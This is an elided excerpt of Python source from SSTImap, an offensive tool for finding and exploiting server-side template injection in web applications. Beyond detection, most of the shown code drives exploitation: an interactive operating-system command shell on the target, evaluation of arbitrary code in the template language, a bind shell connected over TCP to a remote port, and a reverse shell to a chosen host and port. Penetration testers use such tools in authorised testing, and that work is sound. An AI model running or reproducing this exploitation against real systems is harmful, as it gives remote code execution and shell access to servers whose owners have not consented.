        ...
        for data_type in loaded_data_types:
            if data_type.lower() == line.lower():
                ...
                if "Authors" in loaded_data_types[data_type].data_type_info:
                    message += "Authors:\n"
                    for author in loaded_data_types[data_type].data_type_info[
                        "Authors"
                    ]:
                        message += f" - {author}\n"
                if "References" in loaded_data_types[data_type].data_type_info:
                    message += "References:\n"
                    for ref in loaded_data_types[data_type].data_type_info[
                        "References"
                    ]:
                        message += f" - {ref}\n"
...
def print_injection_summary(channel):
    ...
    wrapper = (
        channel.data.get("wrapper", "{code}").replace("\n", "\\n").format(code=render)
    )
    ...
    log.log(
        21,
        f"""SSTImap identified the following injection point:
...
def detect_template_injection(channel):
    for i in range(len(channel.injs)):
        ...
        if "B" in channel.args.get("technique") and not (
            channel.args.get("boolean_regex_ok")
            or channel.args.get("boolean_regex_err")
        ):
            log.log(
                28, f"Creating page profile for boolean error-based blind detection"
            )
            page_profile, page_vector, success = profile(channel)
            if not success and page_profile:
                log.log(
                    22,
                    "Website seems to be highly dynamic, boolean error-based blind detection will be skipped. "
                ...
                log.log(
                    22,
                    "Connection to the website seems unstable, "
        ...
        for plugin in plugins(channel.args):
            ...
            if (
                ...
                and channel.args.get("engine").lower().replace("-", "_")
                != current_plugin.plugin.lower()
            ):
                continue
...
def check_template_injection(channel):
    ...
    if not any(
        ...
        log.log(
            21,
            f"""Rerun SSTImap providing one of the following options:
    ...
    --os-cmd                     Execute an operating system command.'''
                if channel.data.get("execute") or channel.data.get("execute_blind")
                else ""
            }{
                '''
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.'''
                if channel.data.get("evaluate") or channel.data.get("evaluate_blind")
                else ""
            }{
                '''
        ...
        if channel.data.get("execute_blind"):
            ...
            if channel.args.get("os_cmd"):
                ...
                Shell(
                    ...
                    f"{channel.data.get('os', 'undetected')} (blind) $ ",
                ).cmdloop()
        elif channel.data.get("execute"):
            if channel.args.get("os_cmd"):
                ...
                log.log(21, "Run commands on the operating system.")
                Shell(
                    current_plugin.execute, f"{channel.data.get('os', 'undetected')} $ "
                ).cmdloop()
        else:
            log.log(
                22,
    ...
    if channel.args.get("tpl_code") or channel.args.get("tpl_shell"):
        if channel.data.get("engine"):
            ...
            if channel.args.get("tpl_code"):
                ...
                log.log(
                    21,
                    "Inject multi-line template code. "
    ...
    if channel.args.get("eval_code") or channel.args.get("eval_shell"):
        if channel.data.get("evaluate_blind"):
            ...
            if channel.args.get("eval_code"):
                ...
                log.log(
                    21,
                    "Evaluate multi-line template base language code. "
                    "Press ctrl-D or type 'EOF' on a new line to send the lines",
                )
                MultilineShell(
                    current_plugin.evaluate_blind,
                    f"{channel.data.get('language', '')} > ",
                ).cmdloop()
        elif channel.data.get("evaluate"):
            if channel.args.get("eval_code"):
                ...
                MultilineShell(
                    current_plugin.evaluate, f"{channel.data.get('language', '')} > "
                ).cmdloop()
        else:
            log.log(
                22,
    ...
    if bind_shell_port:
        if channel.data.get("bind_shell"):
            ...
            for idx, thread in enumerate(
                current_plugin.bind_shell(
                    bind_shell_port, shell=channel.args.get("remote_shell")
                )
            ):
                log.log(
                    26,
                    f"Spawn a shell on remote port {bind_shell_port} with payload {idx + 1}",
                )
                ...
                try:
                    a = TcpClient(
                        urlparsed.hostname.decode(), bind_shell_port, timeout=5
                    )
                    a.shell()
                    return current_plugin
                    ...
                    log.debug(
                        f"Error connecting to {urlparsed.hostname}:{bind_shell_port} {e}"
                    )
        else:
            log.log(
    ...
    if reverse_shell_host_port:
        ...
        timeout = 15
        if channel.data.get("reverse_shell"):
            current_plugin.reverse_shell(
                host, port, shell=channel.args.get("remote_shell")
            )
            # Run tcp server
            try:
    ...
    if args["load_forms"]:
        ...
        if os.path.exists(args["load_forms"]):
            try:
                ...
                log.log(
                    21,
                    f"Loaded {len(loaded_forms)} forms from file: {args['load_forms']}",
                )
            except Exception as e:
        ...
        if args["load_urls"]:
            ...
            if os.path.exists(args["load_urls"]):
                try:
                    ...
                    log.log(
                        21,
                        f"Loaded {len(loaded_urls)} URL(s) from file: {args['load_urls']}",
                    )
                except Exception as e:
                    log.log(
